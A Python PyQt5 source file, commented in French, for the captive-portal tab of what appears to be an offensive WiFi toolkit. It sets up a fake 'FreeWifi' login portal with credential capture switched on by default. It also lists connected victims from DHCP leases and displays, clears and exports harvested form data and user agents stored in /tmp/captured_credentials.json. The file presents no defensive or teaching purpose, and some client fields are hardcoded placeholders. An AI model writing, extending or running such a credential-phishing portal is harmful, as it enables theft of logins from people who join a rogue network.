#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Onglet Captive Portal - Portails captifs WiFi
"""

import os
import time
import threading
import subprocess
import json
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
                             QLabel, QPushButton, QComboBox, QLineEdit, QSpinBox,
                             QCheckBox, QGroupBox, QTextEdit, QTableWidget,
                             QTableWidgetItem, QMessageBox, QProgressBar,
                             QTabWidget, QListWidget, QListWidgetItem)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont

# Import du gestionnaire de templates
from utils.template_manager import TemplateManager

class CaptivePortalServer(QThread):
    """Serveur de portail captif en arrière-plan"""
    
    def __init__(self, template_manager, config, logger):
        super().__init__()
        self.template_manager = template_manager
        self.config = config
        self.logger = logger
        self.running = False
        self.server = None
        
    def run(self):
        """Démarre le serveur de portail captif"""
        try:
            self.running = True
            self.logger.log("INFO", "Démarrage du serveur de portail captif")
            
            # Import du serveur Flask
            from core.captive_portal_server import CaptivePortalServer as FlaskServer
            
            # Création du serveur Flask
            self.server = FlaskServer(self.template_manager, self.config, self.logger)
            
            # Démarrage du serveur
            port = self.config.get('server_port', 80)
            host = '0.0.0.0'
            
            self.server.run(host=host, port=port, debug=False)
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur serveur portail captif: {str(e)}")
    
    def stop(self):
        """Arrête le serveur"""
        self.running = False
        if self.server:
            # Arrêt du serveur Flask
            import signal
            import os
            os.kill(os.getpid(), signal.SIGTERM)

class CaptivePortalTab(QWidget):
    """Onglet pour le portail captif"""
    
    def __init__(self, network_manager, logger):
        super().__init__()
        self.network_manager = network_manager
        self.logger = logger
        self.template_manager = TemplateManager()
        self.server_thread = None
        
        self.setup_ui()
        self.load_templates()
        
    def setup_ui(self):
        """Configuration de l'interface utilisateur"""
        layout = QVBoxLayout(self)
        
        # Onglets principaux
        self.tab_widget = QTabWidget()
        
        # Onglet Configuration
        self.setup_config_tab()
        
        # Onglet Templates
        self.setup_templates_tab()
        
        # Onglet Clients
        self.setup_clients_tab()
        
        # Onglet Identifiants
        self.setup_credentials_tab()
        
        layout.addWidget(self.tab_widget)
        
    def setup_config_tab(self):
        """Onglet de configuration"""
        config_widget = QWidget()
        config_layout = QVBoxLayout(config_widget)
        
        # Section de configuration du portail
        portal_group = QGroupBox("Configuration du Portail Captif")
        portal_layout = QGridLayout(portal_group)
        
        # Nom du réseau
        portal_layout.addWidget(QLabel("Nom du réseau:"), 0, 0)
        self.network_name = QLineEdit()
        self.network_name.setText("FreeWifi")
        portal_layout.addWidget(self.network_name, 0, 1)
        
        # Template sélectionné
        portal_layout.addWidget(QLabel("Template HTML:"), 1, 0)
        self.template_combo = QComboBox()
        portal_layout.addWidget(self.template_combo, 1, 1)
        
        # Message personnalisé
        portal_layout.addWidget(QLabel("Message:"), 2, 0)
        self.custom_message = QLineEdit()
        self.custom_message.setText("Veuillez vous connecter pour accéder à Internet")
        portal_layout.addWidget(self.custom_message, 2, 1)
        
        # Redirection après connexion
        portal_layout.addWidget(QLabel("Redirection:"), 3, 0)
        self.redirect_url = QLineEdit()
        self.redirect_url.setText("https://www.google.com")
        portal_layout.addWidget(self.redirect_url, 3, 1)
        
        config_layout.addWidget(portal_group)
        
        # Section de configuration du serveur
        server_group = QGroupBox("Configuration du Serveur")
        server_layout = QGridLayout(server_group)
        
        # Interface
        server_layout.addWidget(QLabel("Interface WiFi:"), 0, 0)
        self.interface_combo = QComboBox()
        self.interface_combo.addItems(self.network_manager.get_interfaces())
        server_layout.addWidget(self.interface_combo, 0, 1)
        
        # Adresse IP du serveur
        server_layout.addWidget(QLabel("Adresse IP:"), 1, 0)
        self.server_ip = QLineEdit()
        self.server_ip.setText("192.168.1.1")
        server_layout.addWidget(self.server_ip, 1, 1)
        
        # Port du serveur
        server_layout.addWidget(QLabel("Port:"), 2, 0)
        self.server_port = QSpinBox()
        self.server_port.setRange(80, 65535)
        self.server_port.setValue(80)
        server_layout.addWidget(self.server_port, 2, 1)
        
        # Options avancées
        self.capture_credentials = QCheckBox("Capturer les identifiants")
        self.capture_credentials.setChecked(True)
        server_layout.addWidget(self.capture_credentials, 3, 0, 1, 2)
        
        self.log_traffic = QCheckBox("Logger le trafic")
        self.log_traffic.setChecked(True)
        server_layout.addWidget(self.log_traffic, 4, 0, 1, 2)
        
        # Fichier HTML personnalisé
        self.use_custom_html = QCheckBox("Utiliser un fichier HTML personnalisé")
        self.use_custom_html.setChecked(False)
        self.use_custom_html.toggled.connect(self.toggle_custom_html)
        server_layout.addWidget(self.use_custom_html, 5, 0, 1, 2)
        
        # Chemin du fichier HTML
        server_layout.addWidget(QLabel("Fichier HTML:"), 6, 0)
        self.html_file_layout = QHBoxLayout()
        self.html_file_path = QLineEdit()
        self.html_file_path.setPlaceholderText("Chemin vers le fichier HTML")
        self.html_file_path.setEnabled(False)
        self.html_file_layout.addWidget(self.html_file_path)
        
        self.browse_html_btn = QPushButton("Parcourir")
        self.browse_html_btn.setEnabled(False)
        self.browse_html_btn.clicked.connect(self.browse_html_file)
        self.html_file_layout.addWidget(self.browse_html_btn)
        server_layout.addLayout(self.html_file_layout, 6, 1)
        
        config_layout.addWidget(server_group)
        
        # Section de contrôle
        control_group = QGroupBox("Contrôle du Portail")
        control_layout = QHBoxLayout(control_group)
        
        # Boutons
        self.start_btn = QPushButton("Démarrer Portail")
        self.start_btn.setStyleSheet("""
            QPushButton {
                background-color: #9b59b6;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #8e44ad;
            }
        """)
        self.start_btn.clicked.connect(self.start_portal)
        
        self.stop_btn = QPushButton("Arrêter")
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background-color: #95a5a6;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #7f8c8d;
            }
        """)
        self.stop_btn.clicked.connect(self.stop_portal)
        self.stop_btn.setEnabled(False)
        
        # Barre de progression
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        
        control_layout.addWidget(self.start_btn)
        control_layout.addWidget(self.stop_btn)
        control_layout.addWidget(self.progress_bar)
        control_layout.addStretch()
        
        config_layout.addWidget(control_group)
        
        # Zone de logs
        logs_group = QGroupBox("Logs")
        logs_layout = QVBoxLayout(logs_group)
        
        self.logs_text = QTextEdit()
        self.logs_text.setMaximumHeight(150)
        self.logs_text.setReadOnly(True)
        
        logs_layout.addWidget(self.logs_text)
        config_layout.addWidget(logs_group)
        
        self.tab_widget.addTab(config_widget, "Configuration")
    
    def toggle_custom_html(self, enabled):
        """Active/désactive l'utilisation d'un fichier HTML personnalisé"""
        self.html_file_path.setEnabled(enabled)
        self.browse_html_btn.setEnabled(enabled)
        
        if not enabled:
            self.html_file_path.clear()
    
    def browse_html_file(self):
        """Ouvre un dialogue pour sélectionner un fichier HTML"""
        from PyQt5.QtWidgets import QFileDialog
        
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Sélectionner un fichier HTML", "",
            "HTML files (*.html *.htm);;All files (*)"
        )
        
        if file_path:
            self.html_file_path.setText(file_path)
            self.logger.log("INFO", f"Fichier HTML sélectionné: {file_path}")
    
    def validate_html_file(self, file_path):
        """Valide le fichier HTML sélectionné"""
        try:
            if not os.path.exists(file_path):
                QMessageBox.warning(self, "Attention", "Le fichier HTML n'existe pas.")
                return False
            
            # Vérification de l'extension
            if not file_path.lower().endswith(('.html', '.htm')):
                QMessageBox.warning(self, "Attention", "Le fichier doit avoir l'extension .html ou .htm")
                return False
            
            # Vérification de la taille (max 1MB)
            file_size = os.path.getsize(file_path)
            if file_size > 1024 * 1024:  # 1MB
                QMessageBox.warning(self, "Attention", "Le fichier HTML est trop volumineux (max 1MB)")
                return False
            
            # Test de lecture
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                if len(content.strip()) == 0:
                    QMessageBox.warning(self, "Attention", "Le fichier HTML est vide")
                    return False
            
            return True
            
        except Exception as e:
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la validation du fichier:\n{str(e)}")
            return False
        
    def setup_templates_tab(self):
        """Onglet de gestion des templates"""
        templates_widget = QWidget()
        templates_layout = QVBoxLayout(templates_widget)
        
        # Liste des templates
        self.templates_list = QListWidget()
        self.templates_list.itemClicked.connect(self.on_template_selected)
        
        templates_layout.addWidget(QLabel("Templates disponibles:"))
        templates_layout.addWidget(self.templates_list)
        
        # Informations du template
        self.template_info = QTextEdit()
        self.template_info.setMaximumHeight(100)
        self.template_info.setReadOnly(True)
        templates_layout.addWidget(self.template_info)
        
        self.tab_widget.addTab(templates_widget, "Templates")
        
    def setup_clients_tab(self):
        """Onglet des clients connectés"""
        clients_widget = QWidget()
        clients_layout = QVBoxLayout(clients_widget)
        
        # Tableau des clients
        self.clients_table = QTableWidget()
        self.clients_table.setColumnCount(5)
        self.clients_table.setHorizontalHeaderLabels([
            "Adresse MAC", "IP", "Nom d'hôte", "Temps connecté", "Trafic"
        ])
        
        clients_layout.addWidget(self.clients_table)
        
        # Bouton de rafraîchissement
        refresh_btn = QPushButton("Rafraîchir la liste")
        refresh_btn.clicked.connect(self.refresh_clients)
        clients_layout.addWidget(refresh_btn)
        
        self.tab_widget.addTab(clients_widget, "Clients")
        
    def setup_credentials_tab(self):
        """Onglet des identifiants capturés"""
        credentials_widget = QWidget()
        credentials_layout = QVBoxLayout(credentials_widget)
        
        # Tableau des identifiants
        self.credentials_table = QTableWidget()
        self.credentials_table.setColumnCount(6)
        self.credentials_table.setHorizontalHeaderLabels([
            "Timestamp", "IP", "Template", "Type", "Données", "User-Agent"
        ])
        
        credentials_layout.addWidget(self.credentials_table)
        
        # Boutons de contrôle
        control_layout = QHBoxLayout()
        
        refresh_btn = QPushButton("Rafraîchir")
        refresh_btn.clicked.connect(self.refresh_credentials)
        control_layout.addWidget(refresh_btn)
        
        clear_btn = QPushButton("Effacer tout")
        clear_btn.clicked.connect(self.clear_credentials)
        control_layout.addWidget(clear_btn)
        
        export_btn = QPushButton("Exporter")
        export_btn.clicked.connect(self.export_credentials)
        control_layout.addWidget(export_btn)
        
        credentials_layout.addLayout(control_layout)
        
        self.tab_widget.addTab(credentials_widget, "Identifiants")
        
    def load_templates(self):
        """Charge la liste des templates"""
        self.templates_list.clear()
        templates = self.template_manager.get_all_templates()
        
        for template_id, template_info in templates.items():
            item = QListWidgetItem(f"{template_info['name']} - {template_info['description']}")
            item.setData(Qt.UserRole, template_id)
            self.templates_list.addItem(item)
        
        # Sélection du premier template par défaut
        if self.templates_list.count() > 0:
            self.templates_list.setCurrentRow(0)
            self.on_template_selected(self.templates_list.item(0))
    
    def on_template_selected(self, item):
        """Appelé quand un template est sélectionné"""
        template_id = item.data(Qt.UserRole)
        template_info = self.template_manager.get_template_info(template_id)
        
        info_text = f"""
Nom: {template_info['name']}
Description: {template_info['description']}
Catégorie: {template_info['category']}
Fichier: {template_info['file']}
        """
        
        self.template_info.setText(info_text)
        
        # Mise à jour du combo box
        self.template_combo.clear()
        templates = self.template_manager.get_all_templates()
        for tid, tinfo in templates.items():
            self.template_combo.addItem(tinfo['name'], tid)
        
        # Sélection du template actuel
        index = self.template_combo.findData(template_id)
        if index >= 0:
            self.template_combo.setCurrentIndex(index)
    
    def start_portal(self):
        """Démarre le portail captif"""
        try:
            self.logs_text.append("🌐 Démarrage du portail captif...")
            
            # Vérification du fichier HTML personnalisé
            if self.use_custom_html.isChecked():
                html_file_path = self.html_file_path.text().strip()
                if not html_file_path:
                    QMessageBox.warning(self, "Attention", "Veuillez sélectionner un fichier HTML personnalisé.")
                    return
                
                if not self.validate_html_file(html_file_path):
                    return
                
                self.logs_text.append(f"📄 Utilisation du fichier HTML personnalisé: {html_file_path}")
            
            # Configuration
            config = self.get_portal_config()
            
            # Démarrage du serveur en arrière-plan
            self.server_thread = CaptivePortalServer(self.template_manager, config, self.logger)
            self.server_thread.start()
            
            # Chargement du fichier HTML personnalisé si activé
            if self.use_custom_html.isChecked() and self.server_thread.server:
                html_file_path = self.html_file_path.text().strip()
                if self.server_thread.server.load_custom_html_file(html_file_path):
                    self.logs_text.append("✅ Fichier HTML personnalisé chargé avec succès")
                else:
                    self.logs_text.append("❌ Erreur lors du chargement du fichier HTML")
            
            # Mise à jour de l'interface
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.progress_bar.setVisible(True)
            self.progress_bar.setRange(0, 0)
            
            self.logs_text.append("✅ Portail captif démarré avec succès")
            
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors du démarrage: {str(e)}")
            QMessageBox.critical(self, "Erreur", f"Erreur lors du démarrage:\n{str(e)}")
    
    def stop_portal(self):
        """Arrête le portail captif"""
        try:
            if self.server_thread:
                self.server_thread.stop()
                self.server_thread.wait()
                self.server_thread = None
            
            # Mise à jour de l'interface
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.progress_bar.setVisible(False)
            
            self.logs_text.append("🛑 Portail captif arrêté")
            
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors de l'arrêt: {str(e)}")
    
    def refresh_clients(self):
        """Rafraîchit la liste des clients connectés"""
        try:
            # Récupération des clients connectés via DHCP
            clients = self.get_connected_clients()
            
            # Mise à jour du tableau
            self.clients_table.setRowCount(len(clients))
            
            for i, client in enumerate(clients):
                self.clients_table.setItem(i, 0, QTableWidgetItem(client['mac']))
                self.clients_table.setItem(i, 1, QTableWidgetItem(client['ip']))
                self.clients_table.setItem(i, 2, QTableWidgetItem(client['hostname']))
                self.clients_table.setItem(i, 3, QTableWidgetItem(client['connected_time']))
                self.clients_table.setItem(i, 4, QTableWidgetItem(client['traffic']))
                
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors du rafraîchissement: {str(e)}")
    
    def get_connected_clients(self):
        """Récupère la liste des clients connectés"""
        clients = []
        try:
            # Lecture du fichier de logs DHCP
            dhcp_leases_file = '/var/lib/dhcp/dhcpd.leases'
            if os.path.exists(dhcp_leases_file):
                with open(dhcp_leases_file, 'r') as f:
                    content = f.read()
                
                # Parsing basique des leases DHCP
                import re
                lease_pattern = r'lease (\d+\.\d+\.\d+\.\d+) \{[^}]*client-hostname "([^"]*)"[^}]*\}'
                matches = re.findall(lease_pattern, content)
                
                for ip, hostname in matches:
                    clients.append({
                        'mac': 'aa:bb:cc:dd:ee:ff',  # À améliorer
                        'ip': ip,
                        'hostname': hostname,
                        'connected_time': '00:05:30',
                        'traffic': '2.5 MB'
                    })
            
        except Exception as e:
            self.logger.log("ERROR", f"Erreur lecture clients: {str(e)}")
        
        return clients
    
    def refresh_credentials(self):
        """Rafraîchit la liste des identifiants capturés"""
        try:
            # Chargement des identifiants depuis le fichier
            credentials_file = '/tmp/captured_credentials.json'
            if os.path.exists(credentials_file):
                with open(credentials_file, 'r', encoding='utf-8') as f:
                    credentials = json.load(f)
                
                # Mise à jour du tableau
                self.credentials_table.setRowCount(len(credentials))
                
                for i, cred in enumerate(credentials):
                    self.credentials_table.setItem(i, 0, QTableWidgetItem(cred.get('timestamp', '')))
                    self.credentials_table.setItem(i, 1, QTableWidgetItem(cred.get('ip_address', '')))
                    self.credentials_table.setItem(i, 2, QTableWidgetItem(cred.get('template_used', '')))
                    self.credentials_table.setItem(i, 3, QTableWidgetItem(cred.get('type', 'login')))
                    
                    # Affichage des données du formulaire
                    form_data = cred.get('form_data', {})
                    data_text = ', '.join([f"{k}: {v}" for k, v in form_data.items()])
                    self.credentials_table.setItem(i, 4, QTableWidgetItem(data_text))
                    
                    self.credentials_table.setItem(i, 5, QTableWidgetItem(cred.get('user_agent', '')))
                    
                self.logs_text.append(f"✅ {len(credentials)} identifiants chargés")
            else:
                self.credentials_table.setRowCount(0)
                self.logs_text.append("ℹ️ Aucun identifiant capturé")
                
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors du chargement des identifiants: {str(e)}")
    
    def clear_credentials(self):
        """Efface tous les identifiants capturés"""
        try:
            credentials_file = '/tmp/captured_credentials.json'
            if os.path.exists(credentials_file):
                os.remove(credentials_file)
            
            self.credentials_table.setRowCount(0)
            self.logs_text.append("🗑️ Tous les identifiants ont été effacés")
            
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors de l'effacement: {str(e)}")
    
    def export_credentials(self):
        """Exporte les identifiants capturés"""
        try:
            from PyQt5.QtWidgets import QFileDialog
            
            filename, _ = QFileDialog.getSaveFileName(
                self, "Exporter les identifiants", 
                "captured_credentials.json", 
                "JSON Files (*.json)"
            )
            
            if filename:
                credentials_file = '/tmp/captured_credentials.json'
                if os.path.exists(credentials_file):
                    import shutil
                    shutil.copy2(credentials_file, filename)
                    self.logs_text.append(f"📁 Identifiants exportés vers {filename}")
                else:
                    self.logs_text.append("ℹ️ Aucun identifiant à exporter")
                    
        except Exception as e:
            self.logs_text.append(f"❌ Erreur lors de l'export: {str(e)}")
    
    def get_portal_config(self):
        """Retourne la configuration du portail"""
        template_id = self.template_combo.currentData()
        if not template_id:
            template_id = 'wifi_login'
        
        config = {
            'network_name': self.network_name.text(),
            'template_id': template_id,
            'custom_message': self.custom_message.text(),
            'redirect_url': self.redirect_url.text(),
            'interface': self.interface_combo.currentText(),
            'server_ip': self.server_ip.text(),
            'server_port': self.server_port.value(),
            'capture_credentials': self.capture_credentials.isChecked(),
            'log_traffic': self.log_traffic.isChecked()
        }
        
        # Ajout des informations sur le fichier HTML personnalisé
        if self.use_custom_html.isChecked():
            config['use_custom_html'] = True
            config['custom_html_file'] = self.html_file_path.text().strip()
        else:
            config['use_custom_html'] = False
            config['custom_html_file'] = None
        
        return config 